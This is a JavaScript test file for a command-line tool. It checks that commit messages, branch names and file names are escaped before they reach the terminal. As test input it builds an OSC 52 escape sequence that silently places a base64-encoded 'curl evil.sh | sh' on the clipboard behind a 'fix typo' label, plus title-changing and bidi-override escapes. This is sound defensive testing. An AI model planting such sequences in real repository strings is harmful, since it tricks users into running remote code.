/**
 * What reaches the terminal [L7].
 *
 * Commit messages, branch names, authors and file names are written by
 * whatever holds the user's seed, and a terminal obeys escape sequences in
 * anything it prints: OSC 52 sets the clipboard (kitty, Alacritty, Windows
 * Terminal and tmux honour it by default), so a planted "fix typo" could load
 * `curl … | sh` for the user to paste. Every output helper escapes what it is
 * given; the CLI's own line breaks and colours are the only control codes
 * that get through.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";

vi.mock("../src/lib/vfs.js", () => ({
    openClient: async () => globalThis.__muhkooTestClient,
    explainWriteFailure: () => null,
}));

const ESC = String.fromCharCode(27);
const BEL = String.fromCharCode(7);
/** OSC 52: put `curl evil.sh | sh` on the clipboard, then show "fix typo". */
const OSC52 = `${ESC}]52;c;Y3VybCBldmlsLnNoIHwgc2g=${BEL}fix typo`;
const RAW = /[\u0000-\u0009\u000b-\u001f\u007f-\u009f\u202a-\u202e\u2066-\u2069]/;

let out;
beforeEach(() => {
    out = [];
    vi.spyOn(console, "log").mockImplementation((...a) => out.push(a.join(" ")));
    vi.spyOn(console, "error").mockImplementation((...a) => out.push(a.join(" ")));
});
afterEach(() => {
    vi.restoreAllMocks();
    vi.unstubAllEnvs();
    vi.resetModules();
});
const printed = () => out.join("\n");

describe("the output helpers escape what they are given", () => {
    it("info, warn, ok, step and table print control characters as visible escapes", async () => {
        const ui = await import("../src/lib/ui.js");
        ui.info(OSC52);
        ui.warn(`a ${OSC52}`);
        ui.ok(`b ${OSC52}`);
        ui.step(`c ${OSC52}`);
        ui.table(["MESSAGE"], [[OSC52], [`bidi \u202eexe.txt`], [`C1 \u009b31m`]]);
        expect(printed()).not.toMatch(RAW);
        expect(printed()).toContain("\\u001b]52;c;");
        expect(printed()).toContain("\\u202e");
        expect(printed()).toContain("\\u009b");
    });

    it("a newline inside a value is escaped; the CLI's own lines are separate arguments", async () => {
        const ui = await import("../src/lib/ui.js");
        ui.warn(`refusing a\n✓ In sync`, "  second line");
        expect(out).toEqual(["⚠ refusing a\\u000a✓ In sync\n  second line"]);
    });

    it("die escapes too", async () => {
        const ui = await import("../src/lib/ui.js");
        vi.spyOn(process, "exit").mockImplementation(() => undefined);
        ui.die(OSC52);
        expect(printed()).not.toMatch(RAW);
    });

    it("json stays valid JSON, with no raw C1 or bidi characters", async () => {
        const ui = await import("../src/lib/ui.js");
        ui.json({ name: `x\u009b\u202ey${ESC}` });
        expect(printed()).not.toMatch(RAW);
        expect(JSON.parse(printed()).name).toBe(`x\u009b\u202ey${ESC}`);
    });

    it("keeps the CLI's own colours while escaping a planted one", async () => {
        vi.stubEnv("FORCE_COLOR", "1");
        vi.stubEnv("NO_COLOR", "");
        const ui = await import("../src/lib/ui.js");
        ui.warn(`branch ${ui.c.bold("main")} ${ESC}[8mhidden`);
        ui.table(["", "BRANCH"], [[ui.c.dim("*"), `x${ESC}[2Jy`]]);
        const text = printed();
        expect(text).toContain(`${ESC}[33m⚠${ESC}[0m`);
        expect(text).toContain(`${ESC}[1mmain${ESC}[0m`);
        expect(text).toContain("\\u001b[8mhidden");
        expect(text).toContain("x\\u001b[2Jy");
        expect(text).not.toContain(`${ESC}[8m`);
        expect(text).not.toContain(`${ESC}[2J`);
    });
});

describe("FORCE_COLOR [review]", () => {
    it.each(["0", "false"])("FORCE_COLOR=%s means no colour, as supports-color and chalk read it", async (value) => {
        vi.stubEnv("FORCE_COLOR", value);
        vi.stubEnv("NO_COLOR", "");
        const ui = await import("../src/lib/ui.js");
        ui.warn("careful");
        expect(printed()).not.toContain(ESC);
    });
});

describe("repository strings reach the terminal escaped", () => {
    const repo = {
        log: async () => [{ hash: "a".repeat(64), parents: ["b".repeat(64)], at: 0, message: OSC52, author: OSC52 }],
        status: async () => [{ kind: "modified", path: `/src/${OSC52}` }],
        currentBranch: async () => `main${ESC}]0;owned${BEL}`,
        current: async () => "c".repeat(64),
        pendingMerge: async () => ({ name: `feature${ESC}]52;c;eA==${BEL}` }),
        branches: async () => ["main", `evil${ESC}]52;c;eA==${BEL}`],
    };
    beforeEach(() => {
        globalThis.__muhkooTestClient = { vcs: { open: () => repo } };
    });

    it.each(["log", "status", "branch"])("vcs %s", async (sub) => {
        const { default: vcs } = await import("../src/commands/vcs.js");
        await vcs({ _: ["vcs", sub], project: "demo" });
        expect(out.length).toBeGreaterThan(0);
        expect(printed()).not.toMatch(RAW);
        expect(printed()).toContain("\\u001b]");
    });

    it("vcs log and vcs commit show a message's first line, as git log --oneline does [review]", async () => {
        // Every newline in a cell is escaped, which is right — so a body
        // printed as `fix\u000a\u000alonger body`.
        const withBody = { ...repo, log: async () => [{ hash: "a".repeat(64), parents: [], at: 0, message: "fix\r\n\r\nlonger body" }], commit: async () => "d".repeat(64) };
        globalThis.__muhkooTestClient = { vcs: { open: () => withBody } };
        const { default: vcs } = await import("../src/commands/vcs.js");
        await vcs({ _: ["vcs", "log"], project: "demo" });
        await vcs({ _: ["vcs", "commit"], project: "demo", message: "fix\n\nlonger body" });
        expect(printed()).toContain("fix");
        expect(printed()).not.toContain("longer body");
        expect(printed()).not.toContain("\\u000a");
    });

    it("vfs ls", async () => {
        globalThis.__muhkooTestClient = {
            vfs: {
                list: async () => [
                    { name: OSC52, kind: "file", size: 3, versions: 1, mtime: 0 },
                    { name: `d${ESC}]0;x${BEL}`, kind: "dir", size: 0, versions: 0, mtime: 0 },
                ],
            },
        };
        const { default: vfs } = await import("../src/commands/vfs.js");
        await vfs({ _: ["vfs", "ls", "/"] });
        expect(printed()).not.toMatch(RAW);
        expect(printed()).toContain("\\u001b]52;c;");
    });
});

describe("vfs cat prints a file's text", () => {
    const text = `line one\r\nline two\t${OSC52}\rhidden\n`;
    let written;
    let tty;
    beforeEach(() => {
        written = [];
        tty = process.stdout.isTTY;
        vi.spyOn(process.stdout, "write").mockImplementation((chunk) => {
            written.push(String(chunk));
            return true;
        });
        globalThis.__muhkooTestClient = { vfs: { readText: async () => text } };
    });
    afterEach(() => {
        process.stdout.isTTY = tty;
    });

    it("to a terminal: its own line breaks and tabs kept, every other control character escaped", async () => {
        process.stdout.isTTY = true;
        const { default: vfs } = await import("../src/commands/vfs.js");
        await vfs({ _: ["vfs", "cat", "/notes.txt"] });
        const shown = written.join("");
        expect(shown).not.toContain(ESC);
        expect(shown).not.toContain(BEL);
        expect(shown).toContain("line one\r\nline two\t\\u001b]52;c;");   // CRLF and the tab kept
        expect(shown).toContain("\\u000dhidden\n");                          // a lone CR overwrites a line: escaped
    });

    it("piped or redirected: exactly the file's text", async () => {
        process.stdout.isTTY = false;
        const { default: vfs } = await import("../src/commands/vfs.js");
        await vfs({ _: ["vfs", "cat", "/notes.txt"] });
        expect(written.join("")).toBe(text);
    });
});

describe("the second Ctrl-C quits [L8]", () => {
    it("the first stops cleanly and says how to quit now; the second exits 130", async () => {
        const { stopOnSignals } = await import("../src/commands/vfs.js");
        const controller = new AbortController();
        const exit = vi.fn();
        const stop = stopOnSignals(controller, { exit });
        stop();
        expect(controller.signal.aborted).toBe(true);
        expect(printed()).toMatch(/Stopping after the current file — press Ctrl-C again to quit now/);
        expect(exit).not.toHaveBeenCalled();
        stop();
        expect(exit).toHaveBeenCalledWith(130);
    });
});
